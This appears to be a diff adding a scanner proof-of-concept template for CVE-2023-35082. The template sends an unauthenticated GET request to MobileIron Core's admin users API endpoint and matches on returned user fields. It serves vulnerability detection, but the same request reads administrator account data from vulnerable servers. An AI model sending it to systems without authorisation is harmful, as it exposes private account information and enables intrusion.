@@ -1,0 +1,24 @@
+id: poc-yaml-mobileiron-core-api-unauthorized-access
+info:
+  name: MobileIron Core 未经身份验证的远程 API 访问(CVE-2023-35082)
+  severity: critical
+  tags:
+  - CVE-2023-35082
+  - 未授权访问
+  finger: MobileIron Core
+requests:
+- method: GET
+  path: /mifs/asfV3/api/v2/admins/users
+  expression: 'status_code == 200
+
+    && contains(body,"results")
+
+    && contains(body,"userId")
+
+    && contains(body,"name")
+
+    && contains(headers,"application/json")
+
+    '
+variables: {}
+transport: http
